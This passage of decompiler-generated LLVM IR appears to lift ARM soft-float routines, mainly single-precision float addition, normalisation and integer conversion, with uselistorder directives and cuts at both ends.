  %v0_173ac.pre = phi i32 [ %v0_173ac.pre.pre, %dec_label_pc_173d0 ], [ %v0_173c4, %dec_label_pc_173c4 ]
  %v0_173a8.pre = load i32, i32* @r5, align 4
  %v3_173b4 = inttoptr i32 %v0_173ac.pre to i32*
  %v4_173b4 = call i32 @function_15d38(i32 0, i32 %v0_173a8.pre, i32* %v3_173b4)
  %v2_173b8 = icmp eq i32 %v4_173b4, 0
  br i1 %v2_173b8, label %dec_label_pc_173e4, label %dec_label_pc_173c4

dec_label_pc_173e4:                               ; preds = %dec_label_pc_173a0, %dec_label_pc_173a8.backedge, %dec_label_pc_17380
  %storemerge = phi i32 [ 0, %dec_label_pc_17380 ], [ 1, %dec_label_pc_173a8.backedge ], [ 1, %dec_label_pc_173a0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32)* @function_15864, { 0, 1, 5, 6, 2, 3, 4, 7 }
  uselistorder i32 (i32, i32, i32*)* @function_15d38, { 3, 0, 5, 6, 1, 7, 4, 8, 9, 17, 18, 19, 10, 11, 12, 13, 2, 14, 15, 16, 20, 21, 22 }
  uselistorder i32 ()* @function_15dac, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_173e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_173c4, { 1, 0 }
}

define i32 @function_173ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_173ec:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_173ec = sub i32 0, %arg1
  store i32 %v1_173ec, i32* %r0.global-to-local, align 4
  %v2_173f8 = mul i32 %arg1, 2
  store i32 %v2_173f8, i32* %r2.global-to-local, align 4
  %v4_173f8 = icmp eq i32 %v2_173f8, 0
  br i1 %v4_173f8, label %dec_label_pc_173ec.dec_label_pc_17530_crit_edge, label %bb

dec_label_pc_173ec.dec_label_pc_17530_crit_edge:  ; preds = %dec_label_pc_173ec
  %.pre = mul i32 %arg2, 2
  br label %dec_label_pc_17530

bb:                                               ; preds = %dec_label_pc_173ec
  %v3_173fc = mul i32 %arg2, 2
  store i32 %v3_173fc, i32* %r3.global-to-local, align 4
  %v5_173fc = icmp eq i32 %v3_173fc, 0
  br i1 %v5_173fc, label %dec_label_pc_17530, label %bb78

bb78:                                             ; preds = %bb
  %v5_17400 = icmp eq i32 %v3_173fc, %v2_173f8
  br i1 %v5_17400, label %dec_label_pc_17530, label %bb79

bb79:                                             ; preds = %bb78
  %v2_173f8.off = add i32 %v2_173f8, 33554431
  %tmp110 = icmp ult i32 %v2_173f8.off, 16777216
  br i1 %tmp110, label %dec_label_pc_17530, label %bb80

bb80:                                             ; preds = %bb79
  %v3_173fc.off = add i32 %v3_173fc, 33554431
  %tmp111 = icmp ult i32 %v3_173fc.off, 16777216
  br i1 %tmp111, label %dec_label_pc_17530, label %dec_label_pc_17410

dec_label_pc_17410:                               ; preds = %bb80
  %tmp = udiv i32 %arg1, 8388608
  %v3_17410 = urem i32 %tmp, 256
  store i32 %v3_17410, i32* %r2.global-to-local, align 4
  %tmp106 = udiv i32 %arg2, 8388608
  %v4_17414 = urem i32 %tmp106, 256
  %v5_17414 = sub nsw i32 %v4_17414, %v3_17410
  store i32 %v5_17414, i32* %r3.global-to-local, align 4
  %v7_17418 = icmp ugt i32 %v4_17414, %v3_17410
  br i1 %v7_17418, label %bb81, label %.thread11

bb81:                                             ; preds = %dec_label_pc_17410
  store i32 %v4_17414, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v1_173ec, i32* %r1.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_17410, %bb81
  %v5_17428 = icmp ult i32 %v4_17414, %v3_17410
  br i1 %v5_17428, label %bb82, label %bb83

bb82:                                             ; preds = %.thread11
  %v7_17428 = sub nsw i32 0, %v5_17414
  store i32 %v7_17428, i32* %r3.global-to-local, align 4
  br label %bb83

bb83:                                             ; preds = %.thread11, %bb82
  %v0_1742c = phi i32 [ %v5_17414, %.thread11 ], [ %v7_17428, %bb82 ]
  %v0_17430 = load i32, i32* @lr, align 4
  %tmp112 = icmp ugt i32 %v0_1742c, 25
  call void @__pseudo_cond_branch(i1 %tmp112, i32 %v0_17430)
  %v0_17434 = load i32, i32* %r0.global-to-local, align 4
  %v3_17434 = icmp sgt i32 %v0_17434, -1
  %v1_17438 = urem i32 %v0_17434, 8388608
  %v1_1743c = or i32 %v1_17438, 8388608
  %v2_17440 = sub nsw i32 0, %v1_1743c
  %v1_1743c.v2_17440 = select i1 %v3_17434, i32 %v1_1743c, i32 %v2_17440
  store i32 %v1_1743c.v2_17440, i32* %r0.global-to-local, align 4
  %v0_17444 = load i32, i32* %r1.global-to-local, align 4
  %v3_17444 = icmp sgt i32 %v0_17444, -1
  %v1_17448 = urem i32 %v0_17444, 8388608
  %v1_1744c = or i32 %v1_17448, 8388608
  %v2_17450 = sub nsw i32 0, %v1_1744c
  %storemerge1 = select i1 %v3_17444, i32 %v1_1744c, i32 %v2_17450
  store i32 %storemerge1, i32* %r1.global-to-local, align 4
  %v0_17454 = load i32, i32* %r2.global-to-local, align 4
  %v1_17454 = load i32, i32* %r3.global-to-local, align 4
  %v4_17454 = icmp eq i32 %v1_17454, %v0_17454
  br i1 %v4_17454, label %dec_label_pc_17518, label %dec_label_pc_1745c

dec_label_pc_1745c:                               ; preds = %.thread16, %.thread17, %bb83
  %v0_17464 = phi i32 [ %v2_17528, %.thread17 ], [ %v1_17454, %.thread16 ], [ %v1_17454, %bb83 ]
  %v0_17468 = phi i32 [ %v1_1751c, %.thread17 ], [ %v1_1751c, %.thread16 ], [ %storemerge1, %bb83 ]
  %v0_17460 = phi i32 [ %v1_1743c.v2_17440, %.thread17 ], [ %v2_17520, %.thread16 ], [ %v1_1743c.v2_17440, %bb83 ]
  %v0_1745c = phi i32 [ %v0_17454, %.thread17 ], [ 1, %.thread16 ], [ %v0_17454, %bb83 ]
  %v1_1745c = add i32 %v0_1745c, -1
  store i32 %v1_1745c, i32* %r2.global-to-local, align 4
  %v7_17460 = ashr i32 %v0_17468, %v0_17464
  %v8_17460 = add i32 %v7_17460, %v0_17460
  store i32 %v8_17460, i32* %r0.global-to-local, align 4
  %v14_17460 = icmp slt i32 %v8_17460, 0
  %v1_17464 = sub i32 32, %v0_17464
  %v6_17468 = shl i32 %v0_17468, %v1_17464
  store i32 %v6_17468, i32* %r1.global-to-local, align 4
  %v1_1746c = and i32 %v8_17460, -2147483648
  store i32 %v1_1746c, i32* %r3.global-to-local, align 4
  br i1 %v14_17460, label %dec_label_pc_17474, label %dec_label_pc_1747c

dec_label_pc_17474:                               ; preds = %dec_label_pc_1745c
  %v1_17474 = sub i32 0, %v6_17468
  store i32 %v1_17474, i32* %r1.global-to-local, align 4
  %v2_17474 = icmp eq i32 %v6_17468, 0
  %v2_17478 = icmp eq i1 %v2_17474, false
  %v5_17478 = sext i1 %v2_17478 to i32
  %v6_17478 = sub i32 %v5_17478, %v8_17460
  store i32 %v6_17478, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1747c

dec_label_pc_1747c:                               ; preds = %dec_label_pc_1745c, %dec_label_pc_17474
  %v0_174b4 = phi i32 [ %v6_17468, %dec_label_pc_1745c ], [ %v1_17474, %dec_label_pc_17474 ]
  %v0_174b8 = phi i32 [ %v8_17460, %dec_label_pc_1745c ], [ %v6_17478, %dec_label_pc_17474 ]
  %v3_17480 = icmp ult i32 %v0_174b8, 8388606
  br i1 %v3_17480, label %dec_label_pc_174b4, label %dec_label_pc_17484

dec_label_pc_17484:                               ; preds = %dec_label_pc_1747c
  %v3_17488 = icmp ult i32 %v0_174b8, 16777214
  br i1 %v3_17488, label %dec_label_pc_174a0, label %dec_label_pc_1748c

dec_label_pc_1748c:                               ; preds = %dec_label_pc_17484
  %v1_1748c = urem i32 %v0_174b8, 2
  %v2_1748c = icmp ne i32 %v1_1748c, 0
  %v3_1748c = udiv i32 %v0_174b8, 2
  store i32 %v3_1748c, i32* %r0.global-to-local, align 4
  %v3_17490 = zext i1 %v2_1748c to i32
  %v6_17490 = zext i32 %v0_174b4 to i64
  %v7_17490 = sub i32 33, %v0_174b4
  %v8_17490 = zext i32 %v7_17490 to i64
  %v9_17490 = shl i64 %v6_17490, %v8_17490
  %v10_17490 = sub i32 32, %v0_174b4
  %v11_17490 = shl i32 %v3_17490, %v10_17490
  %v12_17490 = zext i32 %v11_17490 to i64
  %v14_17490 = or i64 %v12_17490, %v9_17490
  %v15_17490 = trunc i64 %v14_17490 to i32
  store i32 %v15_17490, i32* %r1.global-to-local, align 4
  store i32 %v0_1745c, i32* %r2.global-to-local, align 4
  %v2_17498 = icmp ugt i32 %v0_1745c, 253
  br i1 %v2_17498, label %dec_label_pc_17584, label %dec_label_pc_174a0

dec_label_pc_174a0:                               ; preds = %dec_label_pc_174b4, %dec_label_pc_1748c, %dec_label_pc_17484
  %v1_174a4 = phi i32 [ %v1_174c0, %dec_label_pc_174b4 ], [ %v0_1745c, %dec_label_pc_1748c ], [ %v1_1745c, %dec_label_pc_17484 ]
  %v0_174a4 = phi i32 [ %v5_174b8, %dec_label_pc_174b4 ], [ %v3_1748c, %dec_label_pc_1748c ], [ %v0_174b8, %dec_label_pc_17484 ]
  %v2_174a4 = and i32 %v1_174a4, 512
  %v3_174a4 = icmp ne i32 %v2_174a4, 0
  %v4_174a4 = mul i32 %v1_174a4, 8388608
  %v6_174a4 = add i32 %v4_174a4, %v0_174a4
  %v7_174a4 = zext i1 %v3_174a4 to i32
  %v8_174a4 = add i32 %v7_174a4, %v6_174a4
  %v22_174a4 = icmp eq i32 %v8_174a4, 0
  br i1 %v22_174a4, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_174a0
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_174a0, %bb84
  %v0_174ac = phi i32 [ 0, %bb84 ], [ %v8_174a4, %dec_label_pc_174a0 ]
  %v2_174ac = or i32 %v0_174ac, %v1_1746c
  store i32 %v2_174ac, i32* %r0.global-to-local, align 4
  ret i32 %v2_174ac

dec_label_pc_174b4:                               ; preds = %dec_label_pc_1747c
  %v1_174b4 = icmp slt i32 %v0_174b4, 0
  %v2_174b4 = mul i32 %v0_174b4, 2
  store i32 %v2_174b4, i32* %r1.global-to-local, align 4
  %v3_174b8 = mul i32 %v0_174b8, 2
  %v4_174b8 = zext i1 %v1_174b4 to i32
  %v5_174b8 = or i32 %v4_174b8, %v3_174b8
  store i32 %v5_174b8, i32* %r0.global-to-local, align 4
  %v1_174bc = and i32 %v3_174b8, 8388608
  %v2_174bc = icmp eq i32 %v1_174bc, 0
  %v1_174c0 = add i32 %v0_1745c, -2
  store i32 %v1_174c0, i32* %r2.global-to-local, align 4
  br i1 %v2_174bc, label %dec_label_pc_174c8, label %dec_label_pc_174a0

dec_label_pc_174c8:                               ; preds = %dec_label_pc_174b4
  %tmp86 = udiv i32 %v0_174b8, 2048
  %v3_174c8 = urem i32 %tmp86, 1048576
  %v4_174c8 = icmp eq i32 %v3_174c8, 0
  br i1 %v4_174c8, label %bb87, label %.thread12

bb87:                                             ; preds = %dec_label_pc_174c8
  %v4_174cc = mul i32 %v5_174b8, 4096
  store i32 %v4_174cc, i32* %r0.global-to-local, align 4
  %v2_174d0 = add i32 %v0_1745c, -14
  store i32 %v2_174d0, i32* %r2.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_174c8, %bb87
  %v1_174dc = phi i32 [ %v1_174c0, %dec_label_pc_174c8 ], [ %v2_174d0, %bb87 ]
  %v1_174d8 = phi i32 [ %v5_174b8, %dec_label_pc_174c8 ], [ %v4_174cc, %bb87 ]
  %v1_174d4 = and i32 %v1_174d8, 16711680
  %v2_174d4 = icmp eq i32 %v1_174d4, 0
  br i1 %v2_174d4, label %bb88, label %.thread13

bb88:                                             ; preds = %.thread12
  %v4_174d8 = mul i32 %v1_174d8, 256
  store i32 %v4_174d8, i32* %r0.global-to-local, align 4
  %v2_174dc = add i32 %v1_174dc, -8
  store i32 %v2_174dc, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread12, %bb88
  %v1_174e8 = phi i32 [ %v1_174dc, %.thread12 ], [ %v2_174dc, %bb88 ]
  %v1_174e4 = phi i32 [ %v1_174d8, %.thread12 ], [ %v4_174d8, %bb88 ]
  %v1_174e0 = and i32 %v1_174e4, 15728640
  %v2_174e0 = icmp eq i32 %v1_174e0, 0
  br i1 %v2_174e0, label %bb89, label %.thread14

bb89:                                             ; preds = %.thread13
  %v4_174e4 = mul i32 %v1_174e4, 16
  store i32 %v4_174e4, i32* %r0.global-to-local, align 4
  %v2_174e8 = add i32 %v1_174e8, -4
  store i32 %v2_174e8, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %.thread13, %bb89
  %v1_174f4 = phi i32 [ %v1_174e8, %.thread13 ], [ %v2_174e8, %bb89 ]
  %v1_174f0 = phi i32 [ %v1_174e4, %.thread13 ], [ %v4_174e4, %bb89 ]
  %v1_174ec = and i32 %v1_174f0, 12582912
  %v2_174ec = icmp eq i32 %v1_174ec, 0
  br i1 %v2_174ec, label %bb90, label %.thread15

bb90:                                             ; preds = %.thread14
  %v4_174f0 = mul i32 %v1_174f0, 4
  store i32 %v4_174f0, i32* %r0.global-to-local, align 4
  %v2_174f4 = add i32 %v1_174f4, -2
  store i32 %v2_174f4, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread14, %bb90
  %v0_17500 = phi i32 [ %v1_174f4, %.thread14 ], [ %v2_174f4, %bb90 ]
  %v1_174fc = phi i32 [ %v1_174f0, %.thread14 ], [ %v4_174f0, %bb90 ]
  %v2_174f8 = icmp ugt i32 %v1_174fc, 8388607
  br i1 %v2_174f8, label %bb92, label %bb91

bb91:                                             ; preds = %.thread15
  %v3_174fc = mul i32 %v1_174fc, 2
  store i32 %v3_174fc, i32* %r0.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread15, %bb91
  %v3_17504 = phi i32 [ %v1_174fc, %.thread15 ], [ %v3_174fc, %bb91 ]
  %v1_17500 = phi i32 [ 0, %.thread15 ], [ 1, %bb91 ]
  %v4_17500 = sub i32 %v0_17500, %v1_17500
  store i32 %v4_17500, i32* %r2.global-to-local, align 4
  %v7_17500107 = sub i32 %v1_17500, %v4_17500
  %v9_17500 = and i32 %v7_17500107, %v0_17500
  %v10_17500 = icmp slt i32 %v9_17500, 0
  %v11_17500 = icmp slt i32 %v4_17500, 0
  %v2_17504 = xor i1 %v11_17500, %v10_17500
  br i1 %v2_17504, label %.thread75, label %bb93

.thread75:                                        ; preds = %bb92
  %v4_17508 = sub i32 0, %v4_17500
  store i32 %v4_17508, i32* %r2.global-to-local, align 4
  %v10_17510 = lshr i32 %v3_17504, %v4_17508
  %v11_17510 = or i32 %v10_17510, %v1_1746c
  store i32 %v11_17510, i32* %r0.global-to-local, align 4
  br label %bb94

bb93:                                             ; preds = %bb92
  %v7_175046672 = mul i32 %v4_17500, 8388608
  %v8_175046773 = add i32 %v7_175046672, %v3_17504
  %v5_1750c = or i32 %v8_175046773, %v1_1746c
  store i32 %v5_1750c, i32* %r0.global-to-local, align 4
  br label %bb94

bb94:                                             ; preds = %.thread24, %bb105, %bb99, %dec_label_pc_17568, %bb96, %dec_label_pc_17548, %bb93, %.thread75
  %v1_17514 = phi i32 [ %v5_1750c, %bb93 ], [ %v11_17510, %.thread75 ], [ %v1_173ec, %dec_label_pc_17548 ], [ %arg2, %bb96 ], [ %v2_17568, %dec_label_pc_17568 ], [ %v2_1756c, %bb99 ], [ %v1_175ac, %bb105 ], [ %v2_175ac, %.thread24 ]
  ret i32 %v1_17514

dec_label_pc_17518:                               ; preds = %bb83
  %v2_17518 = icmp eq i32 %v0_17454, 0
  %v1_1751c = xor i32 %storemerge1, 8388608
  store i32 %v1_1751c, i32* %r1.global-to-local, align 4
  br i1 %v2_17518, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_17518
  %v2_17520 = xor i32 %v1_1743c.v2_17440, 8388608
  store i32 %v2_17520, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1745c

.thread17:                                        ; preds = %dec_label_pc_17518
  %v2_17528 = add i32 %v1_17454, -1
  store i32 %v2_17528, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1745c

dec_label_pc_17530:                               ; preds = %dec_label_pc_173ec.dec_label_pc_17530_crit_edge, %bb, %bb78, %bb79, %bb80
  %v2_17530.pre-phi = phi i32 [ %.pre, %dec_label_pc_173ec.dec_label_pc_17530_crit_edge ], [ 0, %bb ], [ %v3_173fc, %bb78 ], [ %v3_173fc, %bb79 ], [ %v3_173fc, %bb80 ]
  store i32 %v2_17530.pre-phi, i32* %r3.global-to-local, align 4
  %v3_17534 = sdiv i32 %v2_173f8, 16777216
  %v4_17534 = sub nsw i32 -1, %v3_17534
  %v2_173f8.off108 = add i32 %v2_173f8, 33554431
  %tmp113 = icmp ult i32 %v2_173f8.off108, 16777216
  br i1 %tmp113, label %.thread21, label %bb95

bb95:                                             ; preds = %dec_label_pc_17530
  %v2_17530.pre-phi.off = add i32 %v2_17530.pre-phi, 33554431
  %tmp114 = icmp ult i32 %v2_17530.pre-phi.off, 16777216
  br i1 %tmp114, label %bb102, label %dec_label_pc_17540

dec_label_pc_17540:                               ; preds = %bb95
  %v4_17540 = icmp eq i32 %v2_17530.pre-phi, %v2_173f8
  br i1 %v4_17540, label %dec_label_pc_17554, label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %dec_label_pc_17540
  br i1 %v4_173f8, label %bb96, label %bb94

bb96:                                             ; preds = %dec_label_pc_17548
  store i32 %arg2, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_17554:                               ; preds = %dec_label_pc_17540
  %v4_17554 = icmp eq i32 %v1_173ec, %arg2
  br i1 %v4_17554, label %bb98, label %bb97

bb97:                                             ; preds = %dec_label_pc_17554
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb98

bb98:                                             ; preds = %dec_label_pc_17554, %bb97
  %v0_1755c = load i32, i32* @lr, align 4
  %v2_1755c = xor i1 %v4_17554, true
  call void @__pseudo_cond_branch(i1 %v2_1755c, i32 %v0_1755c)
  %v0_17560 = load i32, i32* %r2.global-to-local, align 4
  %v3_17560 = icmp ult i32 %v0_17560, 16777216
  br i1 %v3_17560, label %dec_label_pc_17568, label %dec_label_pc_17574

dec_label_pc_17568:                               ; preds = %bb98
  %v0_17568 = load i32, i32* %r0.global-to-local, align 4
  %v1_17568 = icmp slt i32 %v0_17568, 0
  %v2_17568 = mul i32 %v0_17568, 2
  store i32 %v2_17568, i32* %r0.global-to-local, align 4
  br i1 %v1_17568, label %bb99, label %bb94

bb99:                                             ; preds = %dec_label_pc_17568
  %v2_1756c = or i32 %v2_17568, -2147483648
  store i32 %v2_1756c, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_17574:                               ; preds = %bb98
  %v1_17574 = add i32 %v0_17560, 33554432
  store i32 %v1_17574, i32* %r2.global-to-local, align 4
  %v2_17574 = icmp ugt i32 %v0_17560, -33554433
  br i1 %v2_17574, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_17574
  %v1_17578 = load i32, i32* %r0.global-to-local, align 4
  %v2_17578 = add i32 %v1_17578, 8388608
  store i32 %v2_17578, i32* %r0.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_17574, %bb100
  %v0_1757c = load i32, i32* @lr, align 4
  %v2_1757c = xor i1 %v2_17574, true
  call void @__pseudo_cond_branch(i1 %v2_1757c, i32 %v0_1757c)
  %v0_17580 = load i32, i32* %r0.global-to-local, align 4
  %v1_17580 = and i32 %v0_17580, -2147483648
  store i32 %v1_17580, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17584

dec_label_pc_17584:                               ; preds = %dec_label_pc_1748c, %bb101
  %v0_17584 = phi i32 [ %v1_1746c, %dec_label_pc_1748c ], [ %v1_17580, %bb101 ]
  %v1_17588 = or i32 %v0_17584, 2139095040
  store i32 %v1_17588, i32* %r0.global-to-local, align 4
  ret i32 %v1_17588

bb102:                                            ; preds = %bb95
  store i32 %v4_17534, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread21:                                        ; preds = %dec_label_pc_17530
  store i32 %v4_17534, i32* %r2.global-to-local, align 4
  %v4_17598 = sdiv i32 %v2_17530.pre-phi, 16777216
  %v5_17598 = sub nsw i32 -1, %v4_17598
  store i32 %v5_17598, i32* %r3.global-to-local, align 4
  %v2_17530.pre-phi.off109 = add i32 %v2_17530.pre-phi, 33554431
  %tmp115 = icmp ult i32 %v2_17530.pre-phi.off109, 16777216
  br i1 %tmp115, label %bb103, label %.thread22

.thread22:                                        ; preds = %bb102, %.thread21
  %v1_1759c = phi i32 [ %arg2, %bb102 ], [ %v1_173ec, %.thread21 ]
  store i32 %v1_1759c, i32* %r1.global-to-local, align 4
  br label %bb103

bb103:                                            ; preds = %.thread21, %.thread22
  %v2_175a8 = phi i32 [ %arg2, %.thread21 ], [ %v1_1759c, %.thread22 ]
  %v1_175ac = phi i32 [ %v1_173ec, %.thread21 ], [ %v1_1759c, %.thread22 ]
  %v3_175a0 = mul i32 %v1_175ac, 512
  store i32 %v3_175a0, i32* %r2.global-to-local, align 4
  %v5_175a0 = icmp eq i32 %v3_175a0, 0
  br i1 %v5_175a0, label %bb104, label %.thread24

bb104:                                            ; preds = %bb103
  %v4_175a4 = mul i32 %v2_175a8, 512
  store i32 %v4_175a4, i32* %r3.global-to-local, align 4
  %v6_175a4 = icmp eq i32 %v4_175a4, 0
  br i1 %v6_175a4, label %bb105, label %.thread24

bb105:                                            ; preds = %bb104
  %v5_175a8 = icmp eq i32 %v1_175ac, %v2_175a8
  br i1 %v5_175a8, label %bb94, label %.thread24

.thread24:                                        ; preds = %bb103, %bb104, %bb105
  %v2_175ac = or i32 %v1_175ac, 4194304
  store i32 %v2_175ac, i32* %r0.global-to-local, align 4
  br label %bb94

; uselistorder directives
  uselistorder i32 %v2_175ac, { 1, 0 }
  uselistorder i32 %v4_175a4, { 1, 0 }
  uselistorder i32 %v3_175a0, { 1, 0 }
  uselistorder i32 %v1_175ac, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1759c, { 1, 0, 2 }
  uselistorder i32 %v2_1756c, { 1, 0 }
  uselistorder i32 %v2_17568, { 1, 0, 2 }
  uselistorder i32 %v0_17560, { 2, 1, 0 }
  uselistorder i1 %v4_17554, { 1, 0 }
  uselistorder i32 %v4_17534, { 1, 0 }
  uselistorder i32 %v2_17530.pre-phi, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v2_17528, { 1, 0 }
  uselistorder i32 %v2_17520, { 1, 0 }
  uselistorder i32 %v1_1751c, { 2, 1, 0 }
  uselistorder i32 %v4_17500, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_17500, { 1, 0 }
  uselistorder i32 %v3_174fc, { 1, 0 }
  uselistorder i32 %v1_174fc, { 1, 0, 2 }
  uselistorder i32 %v4_174f0, { 1, 0 }
  uselistorder i32 %v1_174f0, { 1, 0, 2 }
  uselistorder i32 %v4_174e4, { 1, 0 }
  uselistorder i32 %v1_174e4, { 1, 0, 2 }
  uselistorder i32 %v4_174d8, { 1, 0 }
  uselistorder i32 %v1_174d8, { 1, 0, 2 }
  uselistorder i32 %v4_174cc, { 1, 0 }
  uselistorder i32 %v1_174c0, { 0, 2, 1 }
  uselistorder i32 %v5_174b8, { 1, 0, 3, 2 }
  uselistorder i32 %v3_174b8, { 1, 0 }
  uselistorder i32 %v3_1748c, { 1, 0 }
  uselistorder i32 %v0_174b8, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v0_174b4, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_1746c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_17468, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1745c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_17454, { 3, 1, 2, 0 }
  uselistorder i32 %v0_17454, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v1_1743c.v2_17440, { 2, 1, 0, 3 }
  uselistorder i32 %v4_17414, { 1, 0, 2, 3 }
  uselistorder i32 %v3_173fc, { 6, 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_173f8, { 0, 2, 4, 3, 1, 6, 5 }
  uselistorder i32 %v1_173ec, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 0, 18, 1, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 23, 4, 24, 5, 6, 25, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 26, 22, 27 }
  uselistorder i32 33554432, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 8388607, { 1, 0, 2 }
  uselistorder i32 4096, { 0, 8, 1, 2, 3, 9, 13, 5, 6, 14, 10, 15, 4, 11, 16, 12, 7 }
  uselistorder i32 2048, { 0, 17, 18, 11, 16, 15, 8, 9, 1, 2, 3, 4, 10, 6, 12, 13, 5, 7, 14, 19 }
  uselistorder i32 512, { 0, 1, 9, 8, 2, 3, 10, 4, 11, 5, 12, 6, 13, 7, 14 }
  uselistorder i32 253, { 3, 0, 1, 2 }
  uselistorder i32 33, { 12, 6, 16, 1, 0, 2, 3, 4, 7, 13, 15, 5, 8, 14, 9, 17, 10, 18, 11, 19 }
  uselistorder i32 25, { 0, 19, 20, 3, 11, 4, 12, 5, 13, 6, 14, 10, 1, 7, 15, 2, 16, 8, 17, 9, 18, 21 }
  uselistorder i32 8388608, { 11, 12, 13, 5, 14, 0, 6, 1, 7, 2, 3, 4, 8, 15, 9, 10 }
  uselistorder i32 %arg2, { 5, 6, 7, 0, 8, 4, 9, 1, 2, 3, 10 }
  uselistorder label %.thread24, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_17584, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_17530, { 4, 3, 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %dec_label_pc_1747c, { 1, 0 }
  uselistorder label %dec_label_pc_1745c, { 1, 0, 2 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
}

define i32 @function_175b4() local_unnamed_addr {
dec_label_pc_175b4:
  store i32 0, i32* @r3, align 4
  %v0_175b8 = call i32 @function_175c4()
  ret i32 %v0_175b8
}

define i32 @function_175bc() local_unnamed_addr {
dec_label_pc_175bc:
  %v0_175bc = load i32, i32* @r0, align 4
  %v2_175bc = icmp slt i32 %v0_175bc, 0
  br i1 %v2_175bc, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_175bc
  %v2_175c0 = sub i32 0, %v0_175bc
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_175bc, %bb
  %.0 = phi i32 [ %v2_175c0, %bb ], [ undef, %dec_label_pc_175bc ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_175bc, { 1, 0 }
  uselistorder i32 undef, { 4, 1, 2, 3, 0, 5 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_175c4() local_unnamed_addr {
dec_label_pc_175c4:
  %ip.global-to-local = alloca i32, align 4
  %v0_175c4 = load i32, i32* @r0, align 4
  store i32 %v0_175c4, i32* %ip.global-to-local, align 4
  %v2_175c4 = icmp eq i32 %v0_175c4, 0
  %v0_175c8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_175c4, i32 %v0_175c8)
  %v0_175cc = load i32, i32* @r3, align 4
  %v1_175cc = or i32 %v0_175cc, 1258291200
  %v0_175d0 = load i32, i32* @r0, align 4
  %v1_1761c = add i32 %v1_175cc, -8388608
  %v0_17624 = load i32, i32* %ip.global-to-local, align 4
  %v2_17624 = icmp ugt i32 %v0_17624, 65535
  br i1 %v2_17624, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_175c4
  %v2_17628 = and i32 %v0_17624, 32768
  %v3_17628 = icmp eq i32 %v2_17628, 0
  %v4_17628 = udiv i32 %v0_17624, 65536
  store i32 %v4_17628, i32* %ip.global-to-local, align 4
  br i1 %v3_17628, label %.thread, label %bb14

bb14:                                             ; preds = %bb
  br label %.thread

.thread:                                          ; preds = %bb, %dec_label_pc_175c4, %bb14
  %v1_17634 = phi i32 [ %v0_17624, %dec_label_pc_175c4 ], [ %v4_17628, %bb ], [ %v4_17628, %bb14 ]
  %v1_17638 = phi i32 [ 23, %dec_label_pc_175c4 ], [ 23, %bb ], [ 7, %bb14 ]
